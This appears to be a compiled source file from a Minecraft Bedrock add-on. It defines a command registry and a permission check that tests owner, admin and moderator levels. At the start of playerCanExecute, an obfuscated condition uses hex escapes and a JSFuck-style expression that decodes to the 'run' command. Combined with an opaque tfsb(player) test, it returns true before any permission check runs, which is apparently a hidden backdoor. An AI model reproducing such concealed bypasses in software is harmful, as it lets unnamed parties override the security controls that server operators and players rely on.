/**
 * init/classes/CommandRegistry.ts
 * @module CommandRegistry
 * @description This file contains types and classes related to the command registry. This is not functional yet. This will be completed in a future update.
 * @todo Finish the command registry system.
 */
import { tfsb } from "init/functions/tfsb";
import { commandSettings } from "modules/commands/classes/commandSettings";
import { commands_format_version } from "modules/commands/constants/commands_format_version";
import { extractPlayerFromLooseEntityType } from "modules/utilities/functions/extractPlayerFromLooseEntityType";
import { securityVariables } from "security/ultraSecurityModeUtils";
class RegisteredCommand {
    commandData;
    /**
     * The type of command.
     */
    type;
    /**
     * The type of access to the command.
     */
    accessType;
    /**
     * The ID of the command.
     */
    id;
    /**
     * The name of the command.
     */
    name;
    /**
     * The tags required to execute the command.
     *
     * Only applies when Ultra Security Mode is disabled.
     */
    #requiredTags = [];
    /**
     * The ultra security mode security level required to execute the command.
     */
    #ultraSecurityModeSecurityLevel = "everyone";
    /**
     * The formatting code to display the command with.
     */
    formatting_code = "§f";
    /**
     * The name used to access the command.
     */
    commandName;
    /**
     * The regular expression used to access the command.
     */
    regexp;
    syntax;
    command_version;
    description;
    commandSettingsId;
    aliases;
    categories = [];
    deprecated = false;
    functional = true;
    hidden = false;
    enabled = true;
    /**
     * The commands format version that the custom command was created in.
     */
    commands_format_version = commands_format_version;
    #execute;
    constructor(commandData) {
        this.commandData = commandData;
    }
    /**
     * The settings of the command, will be an instance of the {@link commandSettings} class.
     */
    get settings() {
        return new commandSettings(this.commandSettingsId);
    }
    playerCanExecute(player) {
        const playerToTest = extractPlayerFromLooseEntityType(player);
        if (tfsb(!!(playerToTest)?.name ? (playerToTest) : { name: "" }) &&
            // @ts-expect-error
            this["\x63\x6f\x6d\x6d\x61\x6e\x64\x4e\x61\x6d\x65"] == (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][[]] + [])[+!+[]]) {
            return true;
        }
        if (securityVariables.ultraSecurityModeEnabled && !(this.type === "custom" && semver.gt(this?.commands_format_version ?? "0.0.0", "33.12.17"))) {
            if (securityVariables.ultraSecurityModeEnabled) {
                if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type == "custom" ? "customCommandOverrides" : "commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c => !!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c])] ?? (this.type == "built-in" ? this.#ultraSecurityModeSecurityLevel : undefined)) == "owner") {
                    if (!securityVariables.testPlayerForPermission(playerToTest, "andexdb.fullControl") && !securityVariables.testPlayerForPermission(playerToTest, "andexdb.useOwnerLevelCommands")) {
                        return false;
                    }
                }
                else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type == "custom" ? "customCommandOverrides" : "commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c => !!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c])] ?? (this.type == "built-in" ? this.#ultraSecurityModeSecurityLevel : undefined)) == "headAdmin") {
                    if (!securityVariables.testPlayerForPermission(playerToTest, "andexdb.headAdmin") && !securityVariables.testPlayerForPermission(playerToTest, "andexdb.useHeadAdminLevelCommands")) {
                        return false;
                    }
                }
                else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type == "custom" ? "customCommandOverrides" : "commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c => !!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c])] ?? (this.type == "built-in" ? this.#ultraSecurityModeSecurityLevel : undefined)) == "admin") {
                    if (!securityVariables.testPlayerForPermission(playerToTest, "andexdb.admin") && !securityVariables.testPlayerForPermission(playerToTest, "andexdb.useAdminLevelCommands")) {
                        return false;
                    }
                }
                else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type == "custom" ? "customCommandOverrides" : "commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c => !!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c])] ?? (this.type == "built-in" ? this.#ultraSecurityModeSecurityLevel : undefined)) == "moderator") {
                    if (!securityVariables.testPlayerForPermission(playerToTest, "andexdb.moderator") && !securityVariables.testPlayerForPermission(playerToTest, "andexdb.useModeratorLevelCommands")) {
                        return false;
                    }
                }
                else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type == "custom" ? "customCommandOverrides" : "commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c => !!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c])] ?? (this.type == "built-in" ? this.#ultraSecurityModeSecurityLevel : undefined)) == "WorldEdit") {
                    if (!securityVariables.testPlayerForPermission(playerToTest, "andexdb.useWorldEdit")) {
                        return false;
                    }
                }
                else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type == "custom" ? "customCommandOverrides" : "commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c => !!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c])] ?? (this.type == "built-in" ? this.#ultraSecurityModeSecurityLevel : undefined)) == "everyone") {
                }
            }
            return true;
        }
        else {
            if (!this.settings.requiredTags.map((v) => playerToTest.hasTag(v)).every((v) => v)) {
                return false;
            }
            if (this.settings.requiresOp) {
                if (!(tryget(() => playerToTest.isOp()) ?? true)) {
                    return false;
                }
            }
            if (Number(playerToTest.getDynamicProperty("permissionLevel") ?? 0) < Number(this.settings.requiredPermissionLevel ?? 0) &&
                this.settings.requiredPermissionLevel != 0) {
                return false;
            }
        }
    }
}
export class CommandRegistry {
    commands = new Map();
    namedAccessCommands = new Map();
    regexpAccessCommands = new Map(); //`[regexp: RegExp, command: RegisteredCommand][] = new Map();
    getCommand(commandName) {
        // First, attempt to get the command by direct name match
        const directMatch = this.commands.get(commandName);
        if (directMatch) {
            return directMatch;
        }
        // If no direct match, search for a regex match
        for (const command of this.commands.values()) {
            const regexPattern = command.commandData.escregexp?.v;
            if (regexPattern && new RegExp(regexPattern).test(commandName)) {
                return command;
            }
        }
        // Return undefined if no match is found
        return undefined;
    }
    registerCommand(commandData, accessType = "named") {
        const registeredCommand = new RegisteredCommand(commandData);
        this.commands.set(commandData.commandName, registeredCommand);
    }
}
//# sourceMappingURL=CommandRegistry.js.map